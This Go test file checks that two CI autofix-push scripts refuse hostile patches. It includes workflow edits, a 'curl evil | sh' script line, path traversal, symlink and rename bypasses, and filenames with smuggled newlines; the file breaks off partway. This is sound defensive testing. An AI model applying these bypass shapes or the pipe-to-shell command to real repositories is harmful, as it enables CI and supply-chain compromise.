package scripts_test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// scripts/bazel-autofix-push.sh and scripts/docs-autofix-push.sh run with a
// write token on untrusted patches. These tests feed them real `git diff`
// output (the good case, and every hostile shape the validator exists for)
// and run the full push/comment flow against a local bare repository standing
// in for github.com and a fake gh.

const docsAutofixPushScript = "scripts/docs-autofix-push.sh"

// autofixRepo is a repository with a "main" branch (base) and a PR head
// commit on top of it (head); patches are made against head.
type autofixRepo struct {
	t    *testing.T
	git  string
	dir  string
	base string
	head string
}

func newAutofixRepo(t *testing.T, files map[string]string, pr func(r *autofixRepo)) *autofixRepo {
	t.Helper()
	git := requireHostTool(t, "git")
	requireHostTool(t, "bash")
	r := &autofixRepo{t: t, git: git, dir: t.TempDir()}
	r.run("init", "-q", "-b", "main")
	r.run("config", "user.name", "t")
	r.run("config", "user.email", "t@example.invalid")
	r.run("config", "core.hooksPath", ".git/hooks")
	for path, body := range files {
		r.write(path, body)
	}
	r.run("add", "-A")
	r.run("commit", "-q", "-m", "base")
	r.base = strings.TrimSpace(r.run("rev-parse", "HEAD"))
	r.head = r.commit("pr", pr)
	return r
}

// newBazelAutofixRepo: the PR edits cmd/bd and adds internal/newpkg; other/
// is a package it does not touch.
func newBazelAutofixRepo(t *testing.T) *autofixRepo {
	return newAutofixRepo(t, map[string]string{
		"BUILD.bazel":                     "# root\n",
		"MODULE.bazel":                    "module(name = \"beads\")\n",
		"MODULE.bazel.lock":               "{}\n",
		"go.mod":                          "module example.com/beads\n",
		"cmd/bd/BUILD.bazel":              "go_library(name = \"bd\")\n",
		"cmd/bd/main.go":                  "package main\n",
		"other/BUILD.bazel":               "go_library(name = \"other\")\n",
		"other/other.go":                  "package other\n",
		".github/workflows/ci.yml":        "name: CI\n",
		"scripts/tool.sh":                 "echo hi\n",
		"third_party/patches/BUILD.bazel": "exports_files([])\n",
	}, func(r *autofixRepo) {
		r.write("cmd/bd/main.go", "package main\n\nimport _ \"example.com/beads/internal/newpkg\"\n")
		r.write("internal/newpkg/newpkg.go", "package newpkg\n")
	})
}

func newDocsAutofixRepo(t *testing.T) *autofixRepo {
	return newAutofixRepo(t, map[string]string{
		"docs/CLI_REFERENCE.md":    "# CLI\n",
		"docs/docs.json":           "{}\n",
		"docs/cli-reference/bd.md": "# bd\n",
		"scripts.sh":               "echo hi\n",
		".github/workflows/ci.yml": "name: CI\n",
		"cmd/bd/main.go":           "package main\n",
	}, func(r *autofixRepo) {
		r.write("cmd/bd/main.go", "package main // new flag\n")
	})
}

func (r *autofixRepo) run(args ...string) string {
	r.t.Helper()
	cmd := exec.Command(r.git, args...)
	cmd.Dir = r.dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null")
	out, err := cmd.CombinedOutput()
	if err != nil {
		r.t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func (r *autofixRepo) write(path, body string) {
	r.t.Helper()
	full := filepath.Join(r.dir, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

// commit records edit as a commit on top of the current HEAD, on branch
// name, and returns to main's head-of-PR state.
func (r *autofixRepo) commit(name string, edit func(r *autofixRepo)) string {
	r.t.Helper()
	edit(r)
	r.run("add", "-A")
	r.run("commit", "-q", "-m", name)
	sha := strings.TrimSpace(r.run("rev-parse", "HEAD"))
	r.run("branch", "-f", "autofix-test-"+name, sha)
	return sha
}

// variant commits edit on top of the PR head without moving it.
func (r *autofixRepo) variant(name string, edit func(r *autofixRepo)) string {
	r.t.Helper()
	r.run("checkout", "-q", "--detach", r.head)
	sha := r.commit(name, edit)
	r.run("checkout", "-q", "--detach", r.head)
	return sha
}

// patch applies edit to a clean PR-head tree, returns the staged diff as a
// patch file and resets the tree.
func (r *autofixRepo) patch(edit func()) string {
	r.t.Helper()
	r.run("checkout", "-q", "--detach", r.head)
	edit()
	r.run("add", "-A")
	diff := r.run("diff", "--cached", "--binary")
	r.run("reset", "-q", "--hard", r.head)
	r.run("clean", "-qfdx")
	return writeRawPatch(r.t, diff)
}

func writeRawPatch(t *testing.T, body string) string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "autofix.patch")
	if err := os.WriteFile(file, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return file
}

func runAutofixCheck(t *testing.T, script, dir, patch string) (string, error) {
	t.Helper()
	cmd := exec.Command("bash", filepath.Join(sourceRepoRoot(t), script), "--check", patch)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// Hostile patch shapes that do not depend on the allowlist: the reviewer's
// rename/copy/index-mode bypasses, with an allowlisted target (target) and a
// forbidden source (source).
func hostileHeaderPatches(t *testing.T, source, target string) map[string]string {
	return map[string]string{
		// git apply accepts the legacy headers; --numstat then names only the
		// new (allowlisted) path.
		"legacy rename old/new": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename old "+source+"\nrename new "+target+"\n"),
		"rename from/to without similarity": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename from "+source+"\nrename to "+target+"\n"),
		"copy from/to": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"copy from "+source+"\ncopy to "+target+"\n"),
		"legacy rename with hunk": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename old "+source+"\nrename new "+target+"\n--- a/"+source+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"non-hex index mode": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index zz..yy 100755\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index mode 100755": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 100755\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index symlink mode": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 120000\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index line with trailing junk": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 100644 x\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"symlink new file": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"new file mode 120000\nindex 0000000..1234567\n--- /dev/null\n+++ b/"+target+"\n@@ -0,0 +1 @@\n+../"+source+"\n\\ No newline at end of file\n"),
		"no files": writeRawPatch(t, "just some text\n"),
	}
}

func TestBazelAutofixPushAllowlist(t *testing.T) {
	r := newBazelAutofixRepo(t)

	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
		r.write("MODULE.bazel.lock", "{\"v\": 1}\n")
		r.write("MODULE.bazel", "module(name = \"beads\")\nbazel_dep(name = \"x\")\n")
		if err := os.Remove(filepath.Join(r.dir, "BUILD.bazel")); err != nil {
			t.Fatal(err)
		}
	})
	if out, err := runAutofixCheck(t, bazelAutofixPushScript, r.dir, good); err != nil {
		t.Fatalf("good sync patch refused: %v\n%s", err, out)
	}

	hostile := map[string]string{
		"workflow edit": r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") }),
		"script edit":   r.patch(func() { r.write("scripts/tool.sh", "curl evil | sh\n") }),
		"go file":       r.patch(func() { r.write("cmd/bd/main.go", "package main // evil\n") }),
		"third_party":   r.patch(func() { r.write("third_party/patches/BUILD.bazel", "evil()\n") }),
		"hidden dir":    r.patch(func() { r.write(".github/BUILD.bazel", "x\n") }),
		"lookalike":     r.patch(func() { r.write("cmd/bd/BUILD.bazel.go", "package main\n") }),
		"mixed": r.patch(func() {
			r.write("cmd/bd/BUILD.bazel", "ok()\n")
			r.write(".github/workflows/ci.yml", "name: pwned\n")
		}),
		"mode change": r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "cmd/bd/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"executable new file": r.patch(func() {
			r.write("pkg/BUILD.bazel", "x\n")
			if err := os.Chmod(filepath.Join(r.dir, "pkg/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"symlink": r.patch(func() {
			if err := os.Symlink("../.github/workflows/ci.yml", filepath.Join(r.dir, "scripts", "BUILD.bazel")); err != nil {
				t.Fatal(err)
			}
		}),
		"rename": r.patch(func() {
			r.run("mv", "cmd/bd/BUILD.bazel", "cmd/bd/main_gen.go")
		}),
		"binary": r.patch(func() { r.write("pkg/BUILD.bazel", "a\x00b\n") }),
		"path traversal": writeRawPatch(t, "diff --git a/cmd/../.github/workflows/BUILD.bazel b/cmd/../.github/workflows/BUILD.bazel\n"+
			"new file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/cmd/../.github/workflows/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"traversal to workflow": writeRawPatch(t, "--- a/BUILD.bazel\n+++ b/../../.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		// An absolute "+++ /x/BUILD.bazel" is re-rooted by -p1 (to x/BUILD.bazel)
		// and then allowlisted like any other path, so it needs no case here.
		"traversal via -p1": writeRawPatch(t, "--- /dev/null\n+++ /../.github/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"header mismatch":   writeRawPatch(t, "diff --git a/BUILD.bazel b/BUILD.bazel\nindex 1..2 100644\n--- a/BUILD.bazel\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		// A newline inside a name would split a newline-separated numstat
		// into two allowlisted-looking lines.
		"newline in name": writeRawPatch(t, "diff --git \"a/BUILD.bazel\\n1\\t0\\tBUILD.bazel\" \"b/BUILD.bazel\\n1\\t0\\tBUILD.bazel\"\n"+
			"new file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ \"b/BUILD.bazel\\n1\\t0\\tBUILD.bazel\"\n@@ -0,0 +1 @@\n+x\n"),
	}
	for name, patch := range hostileHeaderPatches(t, ".github/workflows/ci.yml", "foo/BUILD.bazel") {
		hostile[name] = patch
	}
	for name, patch := range hostile {
		t.Run(name, func(t *testing.T) {
			out, err := runAutofixCheck(t, bazelAutofixPushScript, r.dir, patch)
			if err == nil || !strings.Contains(out, "REFUSED") {
				body, _ := os.ReadFile(patch)
				t.Errorf("hostile patch accepted (err=%v):\n%s\n--- patch ---\n%s", err, out, body)
			}
		})
	}
}

func TestDocsAutofixPushAllowlist(t *testing.T) {
	r := newDocsAutofixRepo(t)
	good := r.patch(func() {
		r.write("docs/CLI_REFERENCE.md", "# CLI\n\nnew flag\n")
		r.write("docs/cli-reference/bd-new.md", "# new\n")
		r.write("docs/docs.json", "{\"a\": 1}\n")
	})
	if out, err := runAutofixCheck(t, docsAutofixPushScript, r.dir, good); err != nil {
		t.Fatalf("good docs patch refused: %v\n%s", err, out)
	}
	hostile := map[string]string{
		"workflow edit": r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") }),
		"script edit":   r.patch(func() { r.write("scripts.sh", "curl evil | sh\n") }),
		"nested":        r.patch(func() { r.write("docs/cli-reference/a/b.md", "x\n") }),
		// The reviewer's end-to-end bypass on main: scripts.sh renamed to
		// an allowlisted doc name.
		"rename script to doc": r.patch(func() {
			r.run("mv", "scripts.sh", "docs/cli-reference/x.md")
		}),
		"mode change": r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "docs/docs.json"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"binary": r.patch(func() { r.write("docs/cli-reference/bin.md", "a\x00b\n") }),
	}
	for name, patch := range hostileHeaderPatches(t, "scripts.sh", "docs/cli-reference/x.md") {
		hostile[name] = patch
	}
	for name, patch := range hostile {
		t.Run(name, func(t *testing.T) {
			out, err := runAutofixCheck(t, docsAutofixPushScript, r.dir, patch)
			if err == nil || !strings.Contains(out, "REFUSED") {
				body, _ := os.ReadFile(patch)
				t.Errorf("hostile patch accepted (err=%v):\n%s\n--- patch ---\n%s", err, out, body)
			}
		})
	}
}

// fakeGH writes a gh stand-in that serves canned API responses from env,
// applies --jq like gh does, and logs every call (with comment bodies) to
// $FAKE_GH_LOG. A call whose endpoint contains $FAKE_GH_FAIL fails.
func fakeGH(t *testing.T) string {
	t.Helper()
	requireHostTool(t, "jq")
	bin := t.TempDir()
	script := `#!/usr/bin/env bash
set -euo pipefail
echo "gh $*" >> "$FAKE_GH_LOG"
method=GET jq_expr="" path=""
while [ $# -gt 0 ]; do
  case "$1" in
    api | --paginate) ;;
    --method) method="$2"; shift ;;
    --jq) jq_expr="$2"; shift ;;
    -F | -f)
      case "$2" in body=@*) { echo "--- body"; cat "${2#body=@}"; } >> "$FAKE_GH_LOG" ;; esac
      shift ;;
    *) path="$1" ;;
  esac
  shift
done
if [ -n "${FAKE_GH_FAIL:-}" ] && [[ "$path" == *"$FAKE_GH_FAIL"* ]]; then
  echo "gh: HTTP 500" >&2
  exit 1
fi
out='{}'
case "$method $path" in
  "GET "*"/pulls?state=open"*) out="$FAKE_PULLS" ;;
  "GET "*/commits/*) out="$(jq -n --arg m "${FAKE_HEAD_MSG:-feat: add a file}" '{commit: {message: $m}}')" ;;
  "GET "*/comments) out="${FAKE_COMMENTS:-[]}" ;;
  "GET "*/rules/branches/*) out="${FAKE_RULES:-[]}" ;;
  "GET "*/branches/*) out="${FAKE_BRANCH:-}"; [ -n "$out" ] || out='{"protected": false}' ;;
esac
if [ -n "$jq_expr" ]; then
  printf '%s' "$out" | jq -r "$jq_expr"
else
  printf '%s' "$out"
fi
`
	if err := os.WriteFile(filepath.Join(bin, "gh"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return bin
}

type autofixFlowResult struct {
	out, log, remote string
	head, branch     string
	err              error
}

type autofixFlow struct {
	script   string // repo-relative, or absolute for a modified copy
	headRepo string
	branch   string
	headSHA  string // PR head (defaults to r.head)
	remoteAt string // where the remote branch points (defaults to headSHA)
	patch    string
	baseRepo string // the PR's base repo in the pulls listing
	env      []string
}

func (r *autofixRepo) runFlow(t *testing.T, f autofixFlow) autofixFlowResult {
	t.Helper()
	if f.headRepo == "" {
		f.headRepo = "owner/beads"
	}
	if f.branch == "" {
		f.branch = "feature/x"
	}
	if f.headSHA == "" {
		f.headSHA = r.head
	}
	if f.remoteAt == "" {
		f.remoteAt = f.headSHA
	}
	if f.baseRepo == "" {
		f.baseRepo = "owner/beads"
	}
	script := f.script
	if !filepath.IsAbs(script) {
		script = filepath.Join(sourceRepoRoot(t), script)
	}
	github := t.TempDir()
	remote := filepath.Join(github, "owner", "beads.git")
	r.run("clone", "-q", "--bare", r.dir, remote)
	r.run("--git-dir="+remote, "branch", "-f", "main", r.base)
	r.run("--git-dir="+remote, "branch", "-f", f.branch, f.remoteAt)
	gitconfig := filepath.Join(t.TempDir(), "gitconfig")
	if err := os.WriteFile(gitconfig, []byte("[url \"file://"+github+"/\"]\n\tinsteadOf = https://github.com/\n"+
		"[uploadpack]\n\tallowFilter = true\n[protocol \"file\"]\n\tallow = always\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	log := filepath.Join(t.TempDir(), "gh.log")
	pulls := `[{"number":7,"head":{"ref":"` + f.branch + `","sha":"` + f.headSHA + `","repo":{"full_name":"` + f.headRepo + `"}},` +
		`"base":{"ref":"main","repo":{"full_name":"` + f.baseRepo + `"}}}]`
	cmd := exec.Command("bash", script)
	cmd.Dir = t.TempDir()
	cmd.Env = append([]string{
		"PATH=" + fakeGH(t) + string(os.PathListSeparator) + os.Getenv("PATH"),
		"HOME=" + t.TempDir(),
		"GIT_CONFIG_GLOBAL=" + gitconfig, "GIT_CONFIG_NOSYSTEM=1",
		"FAKE_GH_LOG=" + log, "FAKE_PULLS=" + pulls,
		"BASE_REPO=owner/beads", "HEAD_REPO=" + f.headRepo, "HEAD_BRANCH=" + f.branch, "HEAD_SHA=" + f.headSHA,
		"PATCH_FILE=" + f.patch, "RUN_ID=42", "RUN_URL=https://github.com/owner/beads/actions/runs/42",
		"GH_TOKEN=api-token", "PUSH_TOKEN=push-token",
	}, f.env...)
	out, err := cmd.CombinedOutput()
	logBody, _ := os.ReadFile(log)
	head := strings.TrimSpace(r.run("--git-dir="+remote, "rev-parse", f.branch))
	return autofixFlowResult{out: string(out), log: string(logBody), remote: remote, head: head, branch: f.branch, err: err}
}

// withoutValidator copies script with its up-front validate_patch call
// disabled, so a flow test exercises the post-apply staged check alone.
func withoutValidator(t *testing.T, script string) string {
	t.Helper()
	body := readPolicyFile(t, sourceRepoRoot(t), script)
	call := "\nvalidate_patch \"$PATCH_FILE\"\n"
	if strings.Count(body, call) != 1 {
		t.Fatalf("%s: want exactly one %q", script, call)
	}
	copyPath := filepath.Join(t.TempDir(), filepath.Base(script))
	if err := os.WriteFile(copyPath, []byte(strings.Replace(body, call, "\n: skipped validate_patch\n", 1)), 0o755); err != nil {
		t.Fatal(err)
	}
	return copyPath
}

func TestBazelAutofixPushFlow(t *testing.T) {
	r := newBazelAutofixRepo(t)
	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
	})
	flow := func(f autofixFlow) autofixFlow {
		f.script = bazelAutofixPushScript
		if f.patch == "" {
			f.patch = good
		}
		return f
	}
	unchanged := func(t *testing.T, res autofixFlowResult, want string) {
		t.Helper()
		if res.head != r.head {
			t.Errorf("branch moved to %s; want no push\n%s\n%s", res.head, res.out, res.log)
		}
		if want != "" && !strings.Contains(res.log+res.out, want) {
			t.Errorf("want %q in output or comment:\n%s\n%s", want, res.out, res.log)
		}
	}

	t.Run("same-repo PR gets the sync commit", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if res.head == r.head {
			t.Fatalf("branch not advanced:\n%s", res.out)
		}
		if parent := strings.TrimSpace(r.run("--git-dir="+res.remote, "rev-parse", res.head+"^")); parent != r.head {
			t.Errorf("pushed commit parent = %s, want the PR head %s", parent, r.head)
		}
		files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head)
		if files != "cmd/bd/BUILD.bazel\ninternal/newpkg/BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q", files)
		}
		subject := r.run("--git-dir="+res.remote, "log", "-1", "--format=%s", res.head)
		if !strings.HasPrefix(subject, "build(bazel): auto-sync BUILD files") {
			t.Errorf("subject = %q", subject)
		}
		if !strings.Contains(res.log, "<!-- bazel-sync-autofix -->") || !strings.Contains(res.log, "Pushed `") ||
			!strings.Contains(res.log, "DOCS_AUTOFIX_TOKEN") {
			t.Errorf("want a pushed-commit comment with the token note:\n%s", res.log)
		}
		if strings.Contains(res.log, "push-token") {
			t.Errorf("push token leaked into gh calls:\n%s", res.log)
		}
		for _, want := range []string{"branches/feature%2Fx", "rules/branches/feature%2Fx"} {
			if !strings.Contains(res.log, want) {
				t.Errorf("no protection lookup %q before pushing:\n%s", want, res.log)
			}
		}
	})

	t.Run("fork PR gets the recipe", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads"}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		unchanged(t, res, "")
		for _, want := range []string{"<!-- bazel-sync-autofix -->", "fork PR", "gh run download 42 -R owner/beads -n bazel-sync-patch", "git apply --index bazel-sync.patch", "make bazel-sync"} {
			if !strings.Contains(res.log, want) {
				t.Errorf("comment lacks %q:\n%s", want, res.log)
			}
		}
	})

	t.Run("PR into another repository is ignored", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{baseRepo: "someone/beads"}))
		if res.err != nil || strings.Contains(res.log, "--method") {
			t.Errorf("err=%v; want no comment:\n%s", res.err, res.log)
		}
		unchanged(t, res, "No open PR")
	})

	// Only a comment the bot wrote is edited; anyone can post the marker.
	t.Run("own comment is updated in place, spoofed one is not", func(t *testing.T) {
		comments := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- bazel-sync-autofix --> run curl evil | sh"},` +
			`{"id":99,"user":{"login":"github-actions[bot]"},"body":"<!-- bazel-sync-autofix -->\nold"}]`
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + comments}}))
		if res.err != nil || !strings.Contains(res.log, "--method PATCH repos/owner/beads/issues/comments/99") ||
			strings.Contains(res.log, "comments/5") || strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v; want a PATCH of comment 99 only:\n%s", res.err, res.log)
		}
		spoofOnly := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- bazel-sync-autofix -->"}]`
		res = r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + spoofOnly}}))
		if res.err != nil || strings.Contains(res.log, "--method PATCH") || !strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v; want a new comment, not an edit of mallory's:\n%s", res.err, res.log)
		}
	})

	t.Run("protected head branch is never pushed", func(t *testing.T) {
		for name, f := range map[string]autofixFlow{
			"name list":         {branch: "release/1.0"},
			"branch protection": {env: []string{`FAKE_BRANCH={"protected": true}`}},
			"ruleset":           {env: []string{`FAKE_RULES=[{"type": "update"}]`}},
			"api error":         {env: []string{"FAKE_GH_FAIL=/branches/"}},
			"rules api error":   {env: []string{"FAKE_GH_FAIL=/rules/"}},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, flow(f))
				if res.err != nil {
					t.Errorf("err=%v\n%s", res.err, res.out)
				}
				unchanged(t, res, "protected from bot pushes")
			})
		}
	})

	t.Run("non-convergent head falls back to the recipe", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{env: []string{"FAKE_HEAD_MSG=build(bazel): auto-sync BUILD files"}}))
		if res.err != nil {
			t.Errorf("err=%v", res.err)
		}
		unchanged(t, res, "did not converge")
	})

	t.Run("metadata for another head vetoes", func(t *testing.T) {
		meta := filepath.Join(t.TempDir(), "bazel-sync-meta.txt")
		if err := os.WriteFile(meta, []byte("pr=7\nhead_sha="+strings.Repeat("a", 40)+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		res := r.runFlow(t, flow(autofixFlow{env: []string{"META_FILE=" + meta}}))
		if res.err != nil || res.log != "" {
			t.Errorf("err=%v gh log=%q\n%s", res.err, res.log, res.out)
		}
		unchanged(t, res, "")
	})

	t.Run("hostile patch fails before any API call", func(t *testing.T) {
		evil := r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") })
		res := r.runFlow(t, flow(autofixFlow{patch: evil}))
		if res.err == nil || res.log != "" || !strings.Contains(res.out, "REFUSED") {
			t.Errorf("err=%v gh log=%q\n%s", res.err, res.log, res.out)
		}
		unchanged(t, res, "")
	})

	// The reviewer's bypasses, with the up-front validator switched off: the
	// post-apply staged check alone still refuses them.
	t.Run("staged check alone refuses renames", func(t *testing.T) {
		noValidator := withoutValidator(t, bazelAutofixPushScript)
		for name, patch := range map[string]string{
			"legacy rename old/new": writeRawPatch(t, "diff --git a/.github/workflows/ci.yml b/internal/newpkg/BUILD.bazel\n"+
				"rename old .github/workflows/ci.yml\nrename new internal/newpkg/BUILD.bazel\n"),
			"rename from/to": writeRawPatch(t, "diff --git a/scripts/tool.sh b/internal/newpkg/BUILD.bazel\n"+
				"rename from scripts/tool.sh\nrename to internal/newpkg/BUILD.bazel\n"),
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, autofixFlow{script: noValidator, patch: patch})
				if res.err == nil && res.head != r.head {
					t.Fatalf("hostile rename pushed:\n%s", res.out)
				}
				unchanged(t, res, "REFUSED: staged change")
			})
		}
	})

	// bazel.yml builds the PR merge commit, so main's own drift is in every
	// PR's patch. It must never be pushed onto a PR that did not cause it.
	t.Run("base-branch drift is not pushed to an unrelated PR", func(t *testing.T) {
		drift := r.patch(func() {
			r.write("other/BUILD.bazel", "go_library(name = \"other\", srcs = [\"other.go\"])\n")
			r.write("MODULE.bazel.lock", "{\"main\": 1}\n")
		})
		res := r.runFlow(t, flow(autofixFlow{patch: drift}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		unchanged(t, res, "files this PR did not change")
	})

	t.Run("mixed drift pushes only the PR's packages", func(t *testing.T) {
		mixed := r.patch(func() {
			r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
			r.write("other/BUILD.bazel", "go_library(name = \"other\", srcs = [\"other.go\"])\n")
			r.write("MODULE.bazel.lock", "{\"main\": 1}\n")
		})
		res := r.runFlow(t, flow(autofixFlow{patch: mixed}))
		if res.err != nil || res.head == r.head {
			t.Fatalf("err=%v head moved=%v\n%s", res.err, res.head != r.head, res.out)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head); files != "cmd/bd/BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q, want only cmd/bd/BUILD.bazel", files)
		}
		if !strings.Contains(res.log, "other/BUILD.bazel") || !strings.Contains(res.log, "MODULE.bazel.lock") {
			t.Errorf("comment does not list the files left alone:\n%s", res.log)
		}
	})

	t.Run("module files are pushed when the PR changed go.mod", func(t *testing.T) {
		gomod := r.variant("gomod", func(r *autofixRepo) { r.write("go.mod", "module example.com/beads\n\nrequire x v1\n") })
		lock := writeRawPatch(t, "diff --git a/MODULE.bazel.lock b/MODULE.bazel.lock\nindex 0967ef4..ab1ba8b 100644\n--- a/MODULE.bazel.lock\n+++ b/MODULE.bazel.lock\n@@ -1 +1 @@\n-{}\n+{\"x\": 1}\n")
		res := r.runFlow(t, flow(autofixFlow{headSHA: gomod, patch: lock}))
		if res.err != nil || res.head == gomod {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", gomod, res.head); files != "MODULE.bazel.lock\n" {
			t.Errorf("pushed commit touches %q", files)
		}
	})

	// The branch was force-pushed back to an ancestor after the run: a plain
	// push would fast-forward and resurrect the dropped head.
	t.Run("push is leased to the run's head", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{remoteAt: r.base}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		if res.head != r.base {
			t.Errorf("branch = %s, want it left at %s (lease should refuse)", res.head, r.base)
		}
		if !strings.Contains(res.log, "pushing the fix to feature/x failed") {
			t.Errorf("want the push-failed recipe:\n%s\n%s", res.out, res.log)
		}
	})

	// A PR head with symlinks at or above an allowlisted path: nothing is
	// written to disk, and git refuses to stage through the link.
	t.Run("symlinked PR tree", func(t *testing.T) {
		symDir := r.variant("symdir", func(r *autofixRepo) {
			r.run("rm", "-rq", "internal/newpkg")
			if err := os.MkdirAll(filepath.Join(r.dir, "internal"), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink("../.github/workflows", filepath.Join(r.dir, "internal", "newpkg")); err != nil {
				t.Fatal(err)
			}
			// Sync tooling change: every patch file counts as the PR's, so
			// only git's own guard stands between the patch and the link.
			r.write("tools/bazel/go_srcs.py", "# touched\n")
		})
		symFile := r.variant("symfile", func(r *autofixRepo) {
			r.run("rm", "-q", "cmd/bd/BUILD.bazel")
			if err := os.Symlink("../../.github/workflows/ci.yml", filepath.Join(r.dir, "cmd", "bd", "BUILD.bazel")); err != nil {
				t.Fatal(err)
			}
		})
		newInLink := writeRawPatch(t, "diff --git a/internal/newpkg/BUILD.bazel b/internal/newpkg/BUILD.bazel\n"+
			"new file mode 100644\nindex 0000000..9daeafb\n--- /dev/null\n+++ b/internal/newpkg/BUILD.bazel\n@@ -0,0 +1 @@\n+test\n")
		editLink := r.patch(func() { r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n") })
		for name, f := range map[string]autofixFlow{
			"new file under a symlinked dir": {headSHA: symDir, patch: newInLink},
			"edit of a symlinked file":       {headSHA: symFile, patch: editLink},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, flow(f))
				if res.head != f.headSHA {
					t.Fatalf("pushed through a symlink (err=%v):\n%s", res.err, res.out)
				}
				if !strings.Contains(res.log, "no longer applies cleanly") {
					t.Errorf("want the does-not-apply recipe:\n%s\n%s", res.out, res.log)
				}
			})
		}
	})
}

func TestDocsAutofixPushFlow(t *testing.T) {
	r := newDocsAutofixRepo(t)
	good := r.patch(func() {
		r.write("docs/CLI_REFERENCE.md", "# CLI\n\nnew flag\n")
		r.write("docs/cli-reference/bd-new.md", "# new\n")
	})
	flow := func(f autofixFlow) autofixFlow {
		f.script = docsAutofixPushScript
		if f.patch == "" {
			f.patch = good
		}
		return f
	}

	t.Run("same-repo PR gets the regen commit", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{}))
		if res.err != nil || res.head == r.head {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head); files != "docs/CLI_REFERENCE.md\ndocs/cli-reference/bd-new.md\n" {
			t.Errorf("pushed commit touches %q", files)
		}
		if !strings.Contains(res.log, "<!-- cli-docs-autofix -->") || !strings.Contains(res.log, "Pushed `") {
